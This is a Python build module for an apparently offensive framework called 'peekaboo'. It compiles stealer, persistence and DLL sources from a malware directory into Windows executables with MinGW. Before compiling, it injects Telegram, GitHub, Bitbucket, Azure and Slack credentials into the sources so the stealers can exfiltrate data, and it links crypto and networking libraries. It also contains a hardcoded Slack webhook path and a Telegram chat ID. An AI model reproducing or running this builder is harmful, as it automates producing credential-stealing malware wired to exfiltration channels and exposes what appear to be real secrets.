"""
peekaboo standalone module compiler.

One typed builder + one shared subprocess path. The three legacy
compile_module / compile_stealer / compile_persistence entry points are kept
as thin wrappers so existing callers (app.py, apt_pipeline.py) keep working
unchanged.

Design:
  - BuildSpec : everything needed to produce one binary (read-only inputs).
  - BuildResult : everything observable about the result (write-only output).
  - build() : the single source of truth for compilation.
  - _apply_credential_subs / _extra_libs : kept module-private; the spec
    decides whether to invoke them.

Source files are always copied to a tempdir; the meow/ tree is read-only.
"""
from __future__ import annotations

import json
import re
import shutil
import subprocess
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

_BASE    = Path(__file__).parent.parent
_CFG_DIR = _BASE / "config"
_SAMPLES = _BASE / "samples"
_MALWARE_DIR = _BASE / "malware"


# -----------------------------------------------------------------------------
# Configurable flags (loaded once at import time from config/builder_config.json
# so a user can tune optimisation / strip / static linking without editing code)
# -----------------------------------------------------------------------------

_DEFAULT_MINGW_FLAGS = [
    "-ffunction-sections", "-fdata-sections", "-Wno-write-strings",
    "-fno-exceptions", "-fmerge-all-constants",
    "-static-libstdc++", "-static-libgcc", "-fpermissive", "-s", "-O2",
]
_DEFAULT_GCC_FLAGS = ["-O2", "-s"]


import cfg as _cfg


def _load_cfg(name: str) -> dict:
    """Back-compat shim — credential configs now live in .env via cfg.py."""
    return _cfg.get(name) or {}


# builder_config is no longer a config file; flags + timeout are hard-coded
# defaults below. Override via env later if a tuning knob is actually needed.
MINGW_FLAGS     = _DEFAULT_MINGW_FLAGS
GCC_FLAGS       = _DEFAULT_GCC_FLAGS
DEFAULT_TIMEOUT = 60


# -----------------------------------------------------------------------------
# Compiler discovery
# -----------------------------------------------------------------------------

_COMPILER_BINS: dict[str, list[str]] = {
    "mingw-gcc": ["x86_64-w64-mingw32-gcc", "/usr/bin/x86_64-w64-mingw32-gcc"],
    "mingw-gpp": ["x86_64-w64-mingw32-g++", "/usr/bin/x86_64-w64-mingw32-g++"],
    "gcc":       ["gcc", "/usr/bin/gcc"],
    "gpp":       ["g++", "/usr/bin/g++"],
}


def _find_compiler(kind: str) -> Optional[str]:
    for c in _COMPILER_BINS.get(kind, []):
        if shutil.which(c) or Path(c).exists():
            return c
    return None


# -----------------------------------------------------------------------------
# Credential substitution (runs against the tempdir copy, never against meow/)
# -----------------------------------------------------------------------------

_CRED_RULES: list[tuple[str, str, list[tuple[str, str]]]] = [
    # (source_regex, config_name, [(placeholder, config_key), ...])
    (r"telegram\.org|sendToTg|TELEGRAM", "telegram_config", [
        ("TELEGRAM_CHAT_ID_PLACEHOLDER",   "chat_id"),
        ("466662506",                      "chat_id"),
        ("TELEGRAM_BOT_TOKEN_PLACEHOLDER", "bot_token"),
    ]),
    (r"api\.github\.com|sendToGit|GITHUB", "github_config", [
        ("github_classic_token",           "github_token"),
        ("GITHUB_TOKEN",                   "github_token"),
        ("GITHUB_REPO_OWNER_PLACEHOLDER",  "repo_owner"),
        ("cocomelonc",                     "repo_owner"),
        ("GITHUB_REPO_NAME_PLACEHOLDER",   "repo_name"),
        ("ejpt",                           "repo_name"),
        ("GITHUB_ISSUE_NUMBER_PLACEHOLDER","issue_number"),
    ]),
    (r"bitbucket\.org|BITBUCKET", "bitbucket_config", [
        ("BITBUCKET_TOKEN_PLACEHOLDER",    "bitbucket_token_base64"),
    ]),
    (r"virustotal\.com|VT_API", "virustotal_config", [
        ("VT_API_KEY_PLACEHOLDER",         "vt_api_key"),
    ]),
    (r"dev\.azure\.com|AZURE", "azure_config", [
        ("AZURE_ORG_PLACEHOLDER",          "azure_org"),
        ("AZURE_PROJECT_PLACEHOLDER",      "azure_project"),
        ("AZURE_PAT_PLACEHOLDER",          "azure_pat"),
    ]),
    (r"angelcam|ANGELCAM", "angelcam_config", [
        ("ANGELCAM_API_KEY_PLACEHOLDER",   "api_key"),
    ]),
]


def _apply_credential_subs(src: str) -> str:
    subs: dict[str, str] = {}
    for pattern, cfg_name, mapping in _CRED_RULES:
        if not re.search(pattern, src, re.I):
            continue
        cfg = _load_cfg(cfg_name)
        for placeholder, key in mapping:
            val = cfg.get(key, "")
            if val and "xxx" not in str(val):
                subs[placeholder] = str(val)

    # Slack is special-cased because the placeholder is a real URL path
    if re.search(r"hooks\.slack|sendToSlack|SLACK", src, re.I):
        cfg = _load_cfg("slack_config")
        url = cfg.get("webhook_url", "")
        if url and "YOUR/WEBHOOK" not in url:
            tail = url.split("hooks.slack.com/", 1)[-1] if "hooks.slack.com/" in url else url
            subs["/services/T05LNF51FAM/B09M7L8BQ91/GQtnKW33OKeQzTZbkZvustAu"] = "/" + tail
            subs["SLACK_WEBHOOK_URL_PLACEHOLDER"] = url

    for placeholder, val in subs.items():
        if placeholder and val:
            src = src.replace(placeholder, val)
    return src


# -----------------------------------------------------------------------------
# Extra-libs auto-detection. Each rule: (regex, link flag).
# Order matters only for stability; matches are unioned.
# -----------------------------------------------------------------------------

_LIB_RULES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"WinHttp|winhttp"),                                  "-lwinhttp"),
    (re.compile(r"GetAdaptersInfo|GetIpAddrTable|iphlpapi", re.I),    "-liphlpapi"),
    (re.compile(r"CryptProtect|CryptUnprotect|crypt32",    re.I),    "-lcrypt32"),
    (re.compile(r"WSAStartup|WSACleanup|ws2_32",           re.I),    "-lws2_32"),
    (re.compile(r"SHGetFolderPath|SHGetSpecialFolder|shlobj", re.I), "-lshell32"),
]


def _extra_libs(src: str) -> list[str]:
    found: list[str] = []
    for rx, flag in _LIB_RULES:
        if rx.search(src) and flag not in found:
            found.append(flag)
    return found


# -----------------------------------------------------------------------------
# Typed build interface
# -----------------------------------------------------------------------------

@dataclass
class BuildSpec:
    """Everything needed to produce one binary. All paths are read-only inputs."""
    name:           str
    src_path:       Path
    out_path:       Path
    compiler:       str            = "mingw-gcc"
    extra_sources:  list[Path]     = field(default_factory=list)
    extra_libs:     list[str]      = field(default_factory=list)
    apply_creds:    bool           = True
    timeout:        int            = DEFAULT_TIMEOUT
    auto_detect_libs: bool         = True
    is_dll:         bool           = False   # adds -shared, forces .dll extension

    def __post_init__(self):
        self.src_path = Path(self.src_path)
        self.out_path = Path(self.out_path)
        self.extra_sources = [Path(p) for p in self.extra_sources]
        # Honour is_dll: rewrite the extension so callers can't pick the wrong one
        if self.is_dll and self.out_path.suffix.lower() != ".dll":
            self.out_path = self.out_path.with_suffix(".dll")


_DLL_PATTERNS = re.compile(
    r"\bDllMain\b|\bAPIENTRY\b|\bDllRegisterServer\b|\bDllGetClassObject\b"
)


def looks_like_dll(src_path: Path) -> bool:
    """Heuristic: detect DLL sources (DllMain / APIENTRY) by scanning the head."""
    try:
        head = Path(src_path).read_text(encoding="utf-8", errors="replace")[:6000]
    except Exception:
        return False
    return bool(_DLL_PATTERNS.search(head))


@dataclass
class BuildResult:
    """Observable outcome of a build. `log` is human-readable; `out_path` is None on failure."""
    ok:          bool
    log:         str
    out_path:    Optional[Path]
    returncode:  Optional[int]
    duration_ms: int


def _compile_cmd(compiler_path: str, kind: str, src: Path, out: Path,
                 extra_libs: list[str], is_dll: bool) -> list[str]:
    flags = list(MINGW_FLAGS if kind.startswith("mingw") else GCC_FLAGS)
    if is_dll:
        # -shared makes a DLL; --kill-at strips the @N suffix from exports.
        flags += ["-shared"]
        if kind.startswith("mingw"):
            flags += ["-Wl,--kill-at"]
    return [compiler_path, *flags, str(src), "-o", str(out), *extra_libs]


def build(spec: BuildSpec) -> BuildResult:
    """Single source of truth for module/stealer/persistence compilation."""
    started = time.monotonic()
    log: list[str] = []

    def _done(ok: bool, out: Optional[Path], rc: Optional[int]) -> BuildResult:
        return BuildResult(
            ok=ok,
            log="\n".join(log),
            out_path=out if (ok and out and out.exists()) else None,
            returncode=rc,
            duration_ms=int((time.monotonic() - started) * 1000),
        )

    if not spec.src_path.exists():
        log.append(f"[fail] source missing: {spec.src_path}")
        return _done(False, None, None)

    compiler_path = _find_compiler(spec.compiler)
    if not compiler_path:
        log.append(f"[fail] compiler not installed: {spec.compiler}")
        return _done(False, None, None)

    spec.out_path.parent.mkdir(parents=True, exist_ok=True)

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)

        # Copy primary + any siblings the discovery layer flagged. meow stays untouched.
        sources_to_copy = [spec.src_path, *spec.extra_sources]
        for s in sources_to_copy:
            try:
                shutil.copy2(s, tmp / s.name)
            except Exception as e:
                log.append(f"[warn] copy {s.name}: {e}")

        primary_tmp = tmp / spec.src_path.name

        # Credential substitution + library auto-detection both want the source body.
        try:
            text = primary_tmp.read_text(encoding="utf-8", errors="replace")
        except Exception as e:
            log.append(f"[fail] read source copy: {e}")
            return _done(False, None, None)

        if spec.apply_creds:
            try:
                text = _apply_credential_subs(text)
                primary_tmp.write_text(text, encoding="utf-8")
            except Exception as e:
                log.append(f"[warn] cred sub: {e}")

        libs = list(spec.extra_libs)
        if spec.auto_detect_libs:
            for flag in _extra_libs(text):
                if flag not in libs:
                    libs.append(flag)

        cmd = _compile_cmd(compiler_path, spec.compiler, primary_tmp,
                           spec.out_path, libs, spec.is_dll)
        log.append(f"[compile] {' '.join(cmd)}")

        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=spec.timeout)
        except subprocess.TimeoutExpired:
            log.append(f"[fail] timed out after {spec.timeout}s")
            return _done(False, None, None)
        except Exception as e:
            log.append(f"[fail] {e}")
            return _done(False, None, None)

        if r.stdout:
            log.append(r.stdout.rstrip())
        if r.stderr:
            log.append(r.stderr.rstrip())

        if r.returncode == 0 and spec.out_path.exists():
            log.append(f"[ok] {spec.out_path.name} ({spec.out_path.stat().st_size:,} bytes)")
            return _done(True, spec.out_path, r.returncode)

        log.append(f"[fail] rc={r.returncode}")
        return _done(False, None, r.returncode)


# -----------------------------------------------------------------------------
# Backward-compatible wrappers (existing callers keep working)
# -----------------------------------------------------------------------------

def compile_module(module_id: str, session_id: str) -> tuple[bool, str, Optional[Path]]:
    """Compile a meow-registry module by id into samples/<session_id>/."""
    import sys
    sys.path.insert(0, str(Path(__file__).parent))
    import discovery

    mod = discovery.get_module(module_id)
    if not mod:
        return False, f"module not found: {module_id}", None
    if not mod.get("compilable", True):
        return False, f"not compilable (compiler: {mod['compiler']})", None

    ext      = ".exe" if mod["platform"] == "windows" else ""
    out_path = _SAMPLES / session_id / f"{mod['slug']}{ext}"
    src_path = Path(mod["src_path"])
    siblings = [Path(s["path"]) for s in mod.get("all_sources", [])
                if Path(s["path"]) != src_path]

    r = build(BuildSpec(
        name=module_id,
        src_path=src_path,
        out_path=out_path,
        compiler=mod["compiler"],
        extra_sources=siblings,
        extra_libs=mod.get("extra_libs", []),
    ))
    return r.ok, r.log, r.out_path


def compile_stealer(stealer_name: str, session_id: str) -> tuple[bool, str, Optional[Path]]:
    """Compile a stealer from malware/stealer/<name>.c into samples/<session_id>/peekaboo.exe."""
    src = _MALWARE_DIR / "stealer" / f"{stealer_name}.c"
    if not src.exists():
        return False, f"stealer source not found: {src.name}", None

    out = _SAMPLES / session_id / "peekaboo.exe"
    r = build(BuildSpec(name=stealer_name, src_path=src, out_path=out))
    return r.ok, r.log, r.out_path


def compile_persistence(persistence_name: str, out_dir: Path) -> tuple[bool, str, Optional[Path]]:
    """Compile malware/persistence/<name>.c into <out_dir>/persistence.exe."""
    src = _MALWARE_DIR / "persistence" / f"{persistence_name}.c"
    if not src.exists():
        return False, f"persistence source not found: {src.name}", None

    out = Path(out_dir) / "persistence.exe"
    # credential subs aren't needed here (persistence files have no secrets)
    r = build(BuildSpec(
        name=persistence_name, src_path=src, out_path=out, apply_creds=False,
    ))
    return r.ok, r.log, r.out_path
